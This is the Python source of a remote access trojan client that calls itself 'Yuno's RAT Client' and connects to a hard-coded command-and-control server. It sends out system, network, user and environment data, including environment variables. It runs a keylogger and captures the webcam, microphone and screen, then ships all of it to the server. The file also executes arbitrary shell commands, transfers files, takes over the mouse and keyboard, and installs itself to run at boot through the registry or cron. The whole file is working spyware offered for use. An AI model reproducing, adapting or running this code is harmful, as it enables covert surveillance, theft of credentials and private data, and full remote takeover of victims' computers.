#!/usr/bin/env python3

# Standard Library Imports
import platform
import subprocess
import json
import time
import os
import threading
import sys
import getpass
import socket
import shutil
import uuid
import datetime
import pytz

# Third-Party Imports
import psutil
import netifaces
from socketio import Client
import cv2
import pyaudio
import wave
import numpy as np
from PIL import ImageGrab
from pynput.keyboard import Listener as KeyboardListener, Key, Controller as KeyboardController
from pynput.mouse import Controller as MouseController, Listener as MouseListener, Button
import base64
import requests

# Platform-Specific Imports
if platform.system() == "Windows":
    import winreg
else:
    print("Windows persistence not supported in this environment. Please run on a Windows machine.")

# Server Settings
SERVER_URL = "https://c2-backend-wily.onrender.com"

# --- Information Gathering Functions ---
def get_system_info():
    """Gather detailed system information."""
    info = {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.release(),
        "os_build": platform.version(),
        "architecture": platform.machine(),
        "platform": platform.platform(),
        "boot_time": datetime.datetime.fromtimestamp(psutil.boot_time()).isoformat(),
        "timezone": str(pytz.timezone('UTC').localize(datetime.datetime.utcnow()).astimezone().tzinfo),
        "python_version": sys.version,
    }
    try:
        if platform.system() == "Windows":
            username = subprocess.run("echo %USERNAME%", shell=True, capture_output=True, text=True).stdout.strip()
        else:
            username = subprocess.run("whoami", shell=True, capture_output=True, text=True).stdout.strip()
        info["username"] = username
    except Exception as e:
        print(f"[!] Error getting username: {e}")
        info["username"] = "unknown"
    return info

def get_hardware_info():
    """Gather hardware information."""
    cpu = psutil.cpu_freq()
    memory = psutil.virtual_memory()
    disk_partitions = psutil.disk_partitions()
    disks = []
    for partition in disk_partitions:
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            disks.append({
                "device": partition.device,
                "mountpoint": partition.mountpoint,
                "fstype": partition.fstype,
                "total_gb": round(usage.total / (1024**3), 2),
                "used_gb": round(usage.used / (1024**3), 2),
                "free_gb": round(usage.free / (1024**3), 2),
                "percent": usage.percent
            })
        except Exception as e:
            print(f"[!] Error getting disk info for {partition.mountpoint}: {e}")

    battery = psutil.sensors_battery()
    battery_info = {
        "percent": battery.percent,
        "power_plugged": battery.power_plugged,
        "secsleft": battery.secsleft if battery and battery.secsleft != psutil.POWER_TIME_UNLIMITED else "unlimited"
    } if battery else None

    return {
        "cpu": {
            "model": platform.processor(),
            "physical_cores": psutil.cpu_count(logical=False),
            "logical_cores": psutil.cpu_count(logical=True),
            "frequency_mhz": cpu.current if cpu else "unknown",
            "min_frequency_mhz": cpu.min if cpu else "unknown",
            "max_frequency_mhz": cpu.max if cpu else "unknown"
        },
        "memory": {
            "total_mb": round(memory.total / (1024**2), 2),
            "available_mb": round(memory.available / (1024**2), 2),
            "percent": memory.percent
        },
        "disks": disks,
        "battery": battery_info
    }

def get_network_info():
    """Gather detailed network information."""
    interfaces = netifaces.interfaces()
    network_info = {}
    ip_addresses = []
    mac_addresses = {}
    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        iface_info = {}
        if netifaces.AF_INET in addrs:
            for addr in addrs[netifaces.AF_INET]:
                ip = addr.get("addr", "Unknown")
                iface_info["ip"] = ip
                if ip != "127.0.0.1":
                    ip_addresses.append(ip)
        if netifaces.AF_LINK in addrs:
            for addr in addrs[netifaces.AF_LINK]:
                mac = addr.get("addr", "Unknown")
                iface_info["mac"] = mac
                mac_addresses[iface] = mac
        network_info[iface] = iface_info

    try:
        public_ip = requests.get("https://api.ipify.org").text
        location_data = requests.get(f"https://ipapi.co/{public_ip}/json/").json()
        location = {
            "public_ip": public_ip,
            "city": location_data.get('city', 'Unknown'),
            "region": location_data.get('region', 'Unknown'),
            "country": location_data.get('country_name', 'Unknown'),
            "latitude": location_data.get('latitude', 'Unknown'),
            "longitude": location_data.get('longitude', 'Unknown'),
            "isp": location_data.get('isp', 'Unknown')
        }
        ip_addresses.append(public_ip)
    except Exception as e:
        print(f"[!] Error getting public IP/location: {e}")
        location = {"public_ip": "Unknown", "city": "Unknown", "country": "Unknown"}

    try:
        gateway = netifaces.gateways()['default'][netifaces.AF_INET][0] if netifaces.gateways().get(netifaces.AF_INET) else "Unknown"
    except Exception as e:
        gateway = "Unknown"
        print(f"[!] Error getting gateway: {e}")

    try:
        if platform.system() == "Windows":
            dns_output = subprocess.run("nslookup", shell=True, capture_output=True, text=True).stdout
            dns = [line.split(": ")[1].strip() for line in dns_output.splitlines() if "Server:" in line]
        else:
            with open("/etc/resolv.conf", "r") as f:
                dns = [line.split()[1] for line in f.readlines() if line.startswith("nameserver")]
        dns = dns if dns else ["Unknown"]
    except Exception as e:
        dns = ["Unknown"]
        print(f"[!] Error getting DNS: {e}")

    return {
        "interfaces": network_info,
        "ip_addresses": ip_addresses,
        "mac_addresses": mac_addresses,
        "location": location,
        "gateway": gateway,
        "dns_servers": dns
    }

def get_user_info():
    """Gather user-related information."""
    try:
        current_user = getpass.getuser()
    except Exception as e:
        current_user = "Unknown"
        print(f"[!] Error getting current user: {e}")

    users = []
    try:
        if platform.system() == "Windows":
            output = subprocess.run("net user", shell=True, capture_output=True, text=True).stdout
            lines = output.splitlines()
            start = False
            for line in lines:
                if "User accounts for" in line:
                    start = True
                    continue
                if start and line.strip() and "--------" not in line:
                    users.extend(line.split())
        else:
            with open("/etc/passwd", "r") as f:
                users = [line.split(":")[0] for line in f.readlines() if not line.startswith("#")]
    except Exception as e:
        print(f"[!] Error getting user accounts: {e}")

    logged_in_users = []
    try:
        for user in psutil.users():
            logged_in_users.append({
                "name": user.name,
                "terminal": user.terminal,
                "host": user.host,
                "started": datetime.datetime.fromtimestamp(user.started).isoformat()
            })
    except Exception as e:
        print(f"[!] Error getting logged-in users: {e}")

    privileges = "unknown"
    try:
        if platform.system() == "Windows":
            output = subprocess.run("whoami /priv", shell=True, capture_output=True, text=True).stdout
            privileges = output.strip()
        else:
            output = subprocess.run("id", shell=True, capture_output=True, text=True).stdout
            privileges = output.strip()
    except Exception as e:
        print(f"[!] Error getting privileges: {e}")

    return {
        "current_user": current_user,
        "user_accounts": users,
        "logged_in_users": logged_in_users,
        "privileges": privileges
    }

def get_software_info():
    """Gather software and process information."""
    installed_apps = []
    try:
        if platform.system() == "Windows":
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")
            i = 0
            while True:
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    try:
                        app_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                        app_version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                        installed_apps.append({"name": app_name, "version": app_version})
                    except:
                        pass
                    winreg.CloseKey(subkey)
                    i += 1
                except OSError:
                    break
            winreg.CloseKey(key)
        else:
            try:
                output = subprocess.run("dpkg -l", shell=True, capture_output=True, text=True).stdout
                for line in output.splitlines():
                    if line.startswith("ii"):
                        parts = line.split()
                        installed_apps.append({"name": parts[1], "version": parts[2]})
            except:
                pass
    except Exception as e:
        print(f"[!] Error getting installed apps: {e}")

    processes = []
    try:
        for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline', 'create_time']):
            try:
                processes.append({
                    "pid": proc.pid,
                    "name": proc.name(),
                    "exe": proc.exe(),
                    "cmdline": proc.cmdline(),
                    "create_time": datetime.datetime.fromtimestamp(proc.create_time()).isoformat()
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    except Exception as e:
        print(f"[!] Error getting processes: {e}")

    return {
        "installed_apps": installed_apps,
        "running_processes": processes
    }

def get_environment_info():
    """Gather environment information."""
    env_vars = dict(os.environ)
    path = env_vars.get("PATH", "Unknown")
    shell = env_vars.get("SHELL", "Unknown")
    return {
        "environment_variables": env_vars,
        "path": path,
        "shell": shell
    }

def get_peripherals_info():
    """Gather information about connected peripherals."""
    webcam_available = False
    try:
        cap = cv2.VideoCapture(0)
        webcam_available = cap.isOpened()
        cap.release()
    except Exception as e:
        print(f"[!] Error checking webcam: {e}")

    mic_available = False
    try:
        p = pyaudio.PyAudio()
        device_count = p.get_device_count()
        for i in range(device_count):
            device_info = p.get_device_info_by_index(i)
            if device_info['maxInputChannels'] > 0:
                mic_available = True
                break
        p.terminate()
    except Exception as e:
        print(f"[!] Error checking mic: {e}")

    usb_devices = []
    try:
        if platform.system() == "Windows":
            output = subprocess.run("wmic path Win32_USBHub get DeviceID,Description", shell=True, capture_output=True, text=True).stdout
            for line in output.splitlines()[1:]:
                if line.strip():
                    parts = line.split(None, 1)
                    usb_devices.append({"device_id": parts[0], "description": parts[1] if len(parts) > 1 else "Unknown"})
        else:
            output = subprocess.run("lsusb", shell=True, capture_output=True, text=True).stdout
            for line in output.splitlines():
                usb_devices.append({"description": line.strip()})
    except Exception as e:
        print(f"[!] Error getting USB devices: {e}")

    return {
        "webcam_available": webcam_available,
        "mic_available": mic_available,
        "usb_devices": usb_devices
    }

def get_security_info():
    """Gather basic security information."""
    antivirus = "unknown"
    try:
        if platform.system() == "Windows":
            output = subprocess.run("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName", shell=True, capture_output=True, text=True).stdout
            avs = [line.strip() for line in output.splitlines() if line.strip() and "displayName" not in line]
            antivirus = avs if avs else "none detected"
        else:
            output = subprocess.run("which clamav", shell=True, capture_output=True, text=True).stdout
            antivirus = "clamav detected" if output.strip() else "none detected"
    except Exception as e:
        print(f"[!] Error checking antivirus: {e}")

    firewall = "unknown"
    try:
        if platform.system() == "Windows":
            output = subprocess.run("netsh advfirewall show allprofiles state", shell=True, capture_output=True, text=True).stdout
            firewall = "enabled" if "ON" in output else "disabled"
        else:
            output = subprocess.run("ufw status", shell=True, capture_output=True, text=True).stdout
            firewall = "enabled" if "active" in output.lower() else "disabled"
    except Exception as e:
        print(f"[!] Error checking firewall: {e}")

    return {
        "antivirus": antivirus,
        "firewall_status": firewall
    }

def can_run_sudo():
    """Check if sudo can run."""
    try:
        result = subprocess.run("sudo -n true", shell=True, capture_output=True, text=True)
        return result.returncode == 0
    except subprocess.CalledProcessError as e:
        print(f"[!] sudo test failed: {e}")
        return False
    except Exception as e:
        print(f"[!] Error checking sudo: {e}")
        return False

# --- Monitoring and Capture Functions ---
def monitor_network(sio):
    """Monitor network traffic and speed."""
    last_bytes_sent = psutil.net_io_counters().bytes_sent
    last_bytes_recv = psutil.net_io_counters().bytes_recv
    last_time = time.time()

    while True:
        time.sleep(5)
        try:
            current_time = time.time()
            current_io = psutil.net_io_counters()
            bytes_sent = current_io.bytes_sent
            bytes_recv = current_io.bytes_recv

            time_diff = current_time - last_time
            sent_speed = ((bytes_sent - last_bytes_sent) * 8 / time_diff) / (1024 * 1024)
            recv_speed = ((bytes_recv - last_bytes_recv) * 8 / time_diff) / (1024 * 1024)

            network_data = {
                "type": "network_data",
                "timestamp": current_time,
                "bytes_sent": bytes_sent,
                "bytes_recv": bytes_recv,
                "sent_speed_mbps": round(sent_speed, 2),
                "recv_speed_mbps": round(recv_speed, 2)
            }
            sio.emit('exfil_data', json.dumps(network_data), namespace='/client')
            print(f"[*] Sent network data: {network_data}")

            last_bytes_sent = bytes_sent
            last_bytes_recv = bytes_recv
            last_time = current_time
        except Exception as e:
            print(f"[!] Error monitoring network: {e}")

def monitor_system(sio):
    """Monitor CPU and memory usage."""
    while True:
        time.sleep(5)
        try:
            cpu_usage = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            memory_usage_mb = memory.used / (1024 * 1024)

            system_data = {
                "type": "system_data",
                "timestamp": time.time(),
                "cpu_usage_percent": round(cpu_usage, 2),
                "memory_usage_mb": round(memory_usage_mb, 2)
            }
            sio.emit('exfil_data', json.dumps(system_data), namespace='/client')
            print(f"[*] Sent system data: {system_data}")
        except Exception as e:
            print(f"[!] Error monitoring system: {e}")

def capture_webcam(sio):
    """Capture a single frame from the webcam."""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("[!] Webcam not accessible")
            sio.emit('exfil_data', json.dumps({"type": "webcam_error", "message": "Webcam not accessible"}), namespace='/client')
            return
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, img_encoded = cv2.imencode('.jpg', frame)
            img_base64 = base64.b64encode(img_encoded.tobytes()).decode('utf-8')
            sio.emit('exfil_data', json.dumps({
                "type": "webcam_data",
                "client_id": sio.sid,
                "image": img_base64
            }), namespace='/client')
            print("[*] Sent webcam data")
        else:
            print("[!] Failed to capture webcam frame")
    except Exception as e:
        print(f"[!] Error capturing webcam: {e}")
        sio.emit('exfil_data', json.dumps({"type": "webcam_error", "message": str(e)}), namespace='/client')

def record_mic(sio, duration=5):
    """Record audio from mic for a specified duration."""
    try:
        p = pyaudio.PyAudio()
        device_count = p.get_device_count()
        mic_available = False
        for i in range(device_count):
            device_info = p.get_device_info_by_index(i)
            if device_info['maxInputChannels'] > 0:
                mic_available = True
                break
        if not mic_available:
            print("[!] No microphone detected")
            sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": "No microphone detected"}), namespace='/client')
            p.terminate()
            return

        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100

        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []

        print("[*] Recording mic...")
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK, exception_on_overflow=False)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        timestamp = time.time()
        mic_file = f"mic_{timestamp}.wav"
        wf = wave.open(mic_file, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()

        if os.path.exists(mic_file):
            with open(mic_file, "rb") as audio_file:
                audio_base64 = base64.b64encode(audio_file.read()).decode('utf-8')
                sio.emit('exfil_data', json.dumps({
                    "type": "mic_data",
                    "client_id": sio.sid,
                    "audio": audio_base64
                }), namespace='/client')
                print("[*] Sent mic data")
            os.remove(mic_file)
        else:
            print(f"[!] Mic file {mic_file} not found after writing")
            sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": f"Mic file {mic_file} not found"}), namespace='/client')
    except Exception as e:
        print(f"[!] Error recording mic: {e}")
        sio.emit('exfil_data', json.dumps({"type": "mic_error", "message": str(e)}), namespace='/client')

def take_screenshot(sio):
    """Capture a screenshot."""
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        with open("screenshot.png", "rb") as img_file:
            img_base64 = base64.b64encode(img_file.read()).decode('utf-8')
            sio.emit('exfil_data', json.dumps({
                "type": "screenshot_data",
                "client_id": sio.sid,
                "image": img_base64
            }), namespace='/client')
            print("[*] Sent screenshot")
        os.remove("screenshot.png")
    except Exception as e:
        print(f"[!] Error taking screenshot: {e}")
        sio.emit('exfil_data', json.dumps({"type": "screenshot_error", "message": str(e)}), namespace='/client')

def stream_screen(sio, stop_event):
    """Stream the victim's screen at 5 FPS."""
    try:
        while not stop_event.is_set():
            screenshot = ImageGrab.grab()
            screenshot = screenshot.resize((1280, 720))  # Resize for performance
            screenshot.save("screen_stream.jpg", quality=50)  # Lower quality for speed
            with open("screen_stream.jpg", "rb") as img_file:
                img_base64 = base64.b64encode(img_file.read()).decode('utf-8')
                sio.emit('exfil_data', json.dumps({
                    "type": "screen_stream",
                    "client_id": sio.sid,
                    "image": img_base64
                }), namespace='/client')
            os.remove("screen_stream.jpg")
            time.sleep(0.2)  # 5 FPS
    except Exception as e:
        print(f"[!] Error streaming screen: {e}")
        sio.emit('exfil_data', json.dumps({"type": "screen_stream_error", "message": str(e)}), namespace='/client')

# --- Input Handling Functions ---
def on_mouse_move(x, y):
    """Log mouse movement (for debugging)."""
    print(f"[*] Mouse moved to ({x}, {y})")

def on_mouse_click(x, y, button, pressed):
    """Log mouse clicks (for debugging)."""
    if pressed:
        print(f"[*] Mouse clicked at ({x}, {y}) with {button}")

def on_keyboard_press(key):
    """Log keyboard presses to keylog.txt."""
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")

def start_keylogger(sio):
    """Start keylogger and send logs periodically."""
    def send_keylog():
        while True:
            time.sleep(10)
            try:
                if os.path.exists("keylog.txt"):
                    with open("keylog.txt", "r") as f:
                        logs = f.read()
                    if logs:
                        sio.emit('exfil_data', json.dumps({
                            "type": "keylog_data",
                            "client_id": sio.sid,
                            "logs": logs
                        }), namespace='/client')
                        print("[*] Sent keylog data")
            except Exception as e:
                print(f"[!] Error sending keylog: {e}")

    with KeyboardListener(on_press=on_keyboard_press) as listener:
        sio.start_background_task(send_keylog)
        listener.join()

def clear_keylogs(sio):
    """Clear keylogs on demand."""
    try:
        with open("keylog.txt", "w") as f:
            f.write("")
        sio.emit('exfil_data', json.dumps({
            "type": "keylog_data",
            "client_id": sio.sid,
            "logs": ""
        }), namespace='/client')
        print("[*] Cleared keylogs")
    except Exception as e:
        print(f"[!] Error clearing keylogs: {e}")

def setup_persistence(sio):
    """Set up persistence for the client to run on boot."""
    try:
        script_path = os.path.abspath(__file__)
        if platform.system() == "Windows":
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "RATClient", 0, winreg.REG_SZ, f"python {script_path}")
            winreg.CloseKey(key)
            output = "Persistence set up via Windows Registry"
        else:
            username = getpass.getuser()
            cron_cmd = f"@reboot {username} python3 {script_path}"
            result = subprocess.run("crontab -l", shell=True, capture_output=True, text=True)
            existing_crons = result.stdout if result.returncode == 0 else ""
            if cron_cmd not in existing_crons:
                new_crons = existing_crons + cron_cmd + "\n"
                subprocess.run("crontab", input=new_crons, text=True)
            output = "Persistence set up via cronjob"

        sio.emit('exfil_data', json.dumps({
            "type": "command_output",
            "command": "setup_persistence",
            "output": output,
            "current_dir": os.getcwd()
        }), namespace='/client')
        print(f"[*] {output}")
    except Exception as e:
        error_msg = f"Error setting up persistence: {e}"
        sio.emit('exfil_data', json.dumps({
            "type": "command_output",
            "command": "setup_persistence",
            "output": error_msg,
            "current_dir": os.getcwd()
        }), namespace='/client')
        print(f"[!] {error_msg}")

# --- Command Execution Functions ---
def execute_command(command, sio):
    """Execute a system command."""
    try:
        if command.strip().lower() == "whoami":
            if platform.system() == "Windows":
                result = subprocess.run("echo %USERNAME%", shell=True, capture_output=True, text=True)
            else:
                result = subprocess.run("whoami", shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr
        elif command.strip().lower().startswith("cd "):
            target_dir = command.strip().split("cd ", 1)[1].strip()
            target_dir = os.path.normpath(target_dir)
            os.chdir(target_dir)
            return f"Changed directory to {os.getcwd()}"
        elif command.strip().lower().startswith("sudo "):
            if not can_run_sudo():
                return "Error: sudo is blocked in this environment (no new privileges flag). Use non-root commands."
            result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=os.getcwd())
            return result.stdout + result.stderr
        elif command.strip().lower() == "help":
            commands = [
                "webcam - Capture webcam image",
                "mic - Record audio from microphone",
                "screenshot - Take a screenshot",
                "move x y - Move mouse to (x, y)",
                "click button - Click mouse (button: left, right)",
                "download <path> - Download a file from client",
                "upload <file> - Upload a file to client (via web interface)",
                "clear_keylogs - Clear keylogs",
                "setup_persistence - Set up client to run on boot",
                "start_stream - Start screen streaming",
                "stop_stream - Stop screen streaming",
                "exit - Disconnect client"
            ]
            return "\n".join(commands)
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=os.getcwd())
            return result.stdout + result.stderr
    except Exception as e:
        return f"Error executing command: {e}"

def handle_mouse_control(command, sio):
    """Handle mouse control commands."""
    mouse = MouseController()
    parts = command.split()
    if len(parts) >= 3 and parts[0].lower() == "move":
        try:
            x, y = int(parts[1]), int(parts[2])
            mouse.position = (x, y)
            sio.emit('exfil_data', json.dumps({
                "type": "command_output",
                "command": command,
                "output": f"Mouse moved to ({x}, {y})",
                "current_dir": os.getcwd()
            }), namespace='/client')
        except ValueError:
            sio.emit('exfil_data', json.dumps({
                "type": "command_output",
                "command": command,
                "output": "Invalid coordinates",
                "current_dir": os.getcwd()
            }), namespace='/client')
    elif len(parts) >= 2 and parts[0].lower() == "click":
        button = parts[1].lower()
        if button in ["left", "right"]:
            mouse.click(Button.left if button == "left" else Button.right, 1)
            sio.emit('exfil_data', json.dumps({
                "type": "command_output",
                "command": command,
                "output": f"Clicked {button} button",
                "current_dir": os.getcwd()
            }), namespace='/client')
        else:
            sio.emit('exfil_data', json.dumps({
                "type": "command_output",
                "command": command,
                "output": "Invalid button (use left or right)",
                "current_dir": os.getcwd()
            }), namespace='/client')

def handle_remote_input(data, sio):
    """Handle remote mouse and keyboard inputs."""
    try:
        input_type = data.get("type")
        if input_type == "mouse_move":
            x, y = data["x"], data["y"]
            mouse = MouseController()
            mouse.position = (x, y)
            print(f"[*] Remote mouse moved to ({x}, {y})")
        elif input_type == "mouse_click":
            button = data["button"]
            pressed = data["pressed"]
            mouse = MouseController()
            if pressed:
                mouse.press(Button.left if button == "left" else Button.right)
            else:
                mouse.release(Button.left if button == "left" else Button.right)
            print(f"[*] Remote mouse {button} {'pressed' if pressed else 'released'}")
        elif input_type == "key_press":
            key = data["key"]
            pressed = data["pressed"]
            keyboard = KeyboardController()
            if pressed:
                if key.startswith("Key."):
                    key_name = key.split("Key.")[1]
                    key_obj = getattr(Key, key_name, None)
                    if key_obj:
                        keyboard.press(key_obj)
                else:
                    keyboard.press(key)
            else:
                if key.startswith("Key."):
                    key_name = key.split("Key.")[1]
                    key_obj = getattr(Key, key_name, None)
                    if key_obj:
                        keyboard.release(key_obj)
                else:
                    keyboard.release(key)
            print(f"[*] Remote key {key} {'pressed' if pressed else 'released'}")
    except Exception as e:
        print(f"[!] Error handling remote input: {e}")
        sio.emit('exfil_data', json.dumps({
            "type": "command_output",
            "command": "remote_input",
            "output": f"Error handling input: {e}",
            "current_dir": os.getcwd()
        }), namespace='/client')

def handle_file_download(command, sio):
    """Handle file download from victim."""
    try:
        path = command.split("download ")[1].strip()
        if os.path.exists(path):
            with open(path, "rb") as f:
                file_data = base64.b64encode(f.read()).decode('utf-8')
                sio.emit('exfil_data', json.dumps({
                    "type": "file_download",
                    "client_id": sio.sid,
                    "filename": os.path.basename(path),
                    "data": file_data
                }), namespace='/client')
                print(f"[*] Sent file {path}")
        else:
            sio.emit('exfil_data', json.dumps({
                "type": "command_output",
                "command": command,
                "output": f"File {path} not found",
                "current_dir": os.getcwd()
            }), namespace='/client')
    except Exception as e:
        sio.emit('exfil_data', json.dumps({
            "type": "command_output",
            "command": command,
            "output": f"Error downloading file: {e}",
            "current_dir": os.getcwd()
        }), namespace='/client')

def handle_file_upload(filename, data, sio):
    """Handle file upload to victim."""
    try:
        file_data = base64.b64decode(data)
        with open(os.path.join(os.getcwd(), filename), "wb") as f:
            f.write(file_data)
        sio.emit('exfil_data', json.dumps({
            "type": "command_output",
            "command": f"upload {filename}",
            "output": f"File {filename} uploaded",
            "current_dir": os.getcwd()
        }), namespace='/client')
        print(f"[*] Received and saved {filename}")
    except Exception as e:
        sio.emit('exfil_data', json.dumps({
            "type": "command_output",
            "command": f"upload {filename}",
            "output": f"Error uploading file: {e}",
            "current_dir": os.getcwd()
        }), namespace='/client')

# --- Main Function ---
def main():
    """Main function to initialize and run the RAT client."""
    sio = Client()
    screen_stream_stop_event = threading.Event()

    try:
        @sio.event(namespace='/client')
        def connect():
            print(f"[*] Connected to RAT server with SID: {sio.sid} on /client namespace")
            system_info = get_system_info()
            hardware_info = get_hardware_info()
            network_info = get_network_info()
            user_info = get_user_info()
            software_info = get_software_info()
            environment_info = get_environment_info()
            peripherals_info = get_peripherals_info()
            security_info = get_security_info()

            exfil_data = {
                "system": system_info,
                "hardware": hardware_info,
                "network": network_info,
                "user": user_info,
                "software": software_info,
                "environment": environment_info,
                "peripherals": peripherals_info,
                "security": security_info,
                "type": "system_info"
            }
            sio.emit('exfil_data', json.dumps(exfil_data), namespace='/client')
            print("[*] Exfiltrated data sent to RAT server")

            sio.start_background_task(monitor_network, sio)
            sio.start_background_task(monitor_system, sio)
            sio.start_background_task(start_keylogger, sio)

        @sio.event(namespace='/client')
        def disconnect():
            print(f"[*] Disconnected from RAT server with SID: {sio.sid} from /client namespace")
            screen_stream_stop_event.set()

        @sio.event(namespace='/client')
        def connect_error(data):
            print(f"[!] Connection failed: {data} - {str(sio.get_last_exception())}")

        @sio.event(namespace='/client')
        def command(data):
            print(f"[*] Received command: {data}")
            if data.strip().lower() == "exit":
                print("[*] Received exit command")
                screen_stream_stop_event.set()
                sio.disconnect()
                return
            elif data.strip().lower() == "webcam":
                capture_webcam(sio)
            elif data.strip().lower() == "mic":
                record_mic(sio)
            elif data.strip().lower() == "screenshot":
                take_screenshot(sio)
            elif data.strip().lower() == "clear_keylogs":
                clear_keylogs(sio)
            elif data.strip().lower() == "setup_persistence":
                setup_persistence(sio)
            elif data.strip().lower() == "start_stream":
                screen_stream_stop_event.clear()
                sio.start_background_task(stream_screen, sio, screen_stream_stop_event)
                sio.emit('exfil_data', json.dumps({
                    "type": "command_output",
                    "command": "start_stream",
                    "output": "Screen streaming started",
                    "current_dir": os.getcwd()
                }), namespace='/client')
            elif data.strip().lower() == "stop_stream":
                screen_stream_stop_event.set()
                sio.emit('exfil_data', json.dumps({
                    "type": "command_output",
                    "command": "stop_stream",
                    "output": "Screen streaming stopped",
                    "current_dir": os.getcwd()
                }), namespace='/client')
            elif data.strip().lower().startswith("move ") or data.strip().lower().startswith("click "):
                handle_mouse_control(data, sio)
            elif data.strip().lower().startswith("download "):
                handle_file_download(data, sio)
            else:
                output = execute_command(data, sio)
                sio.emit('exfil_data', json.dumps({
                    "type": "command_output",
                    "command": data,
                    "output": output,
                    "current_dir": os.getcwd()
                }), namespace='/client')

        @sio.event(namespace='/client')
        def remote_input(data):
            handle_remote_input(data, sio)

        @sio.event(namespace='/client')
        def upload_file(data):
            print(f"[*] Received upload command with data: {data}")
            handle_file_upload(data.get("filename"), data.get("data"), sio)

        while True:
            try:
                print(f"[*] Attempting to connect to {SERVER_URL}")
                sio.connect(SERVER_URL, wait_timeout=10, verify=False, namespaces=['/client'])
                sio.wait()
                break
            except Exception as e:
                print(f"[!] Connection failed: {str(e)}")
                print("[*] Retrying in 5 seconds...")
                time.sleep(5)
    except KeyboardInterrupt:
        print("[*] Shutting down client...")
        screen_stream_stop_event.set()
    finally:
        if sio.connected:
            sio.disconnect()

if __name__ == "__main__":
    print("=== Yuno's RAT Client ===")
    print("A remote access client by Yuno\n")
    main()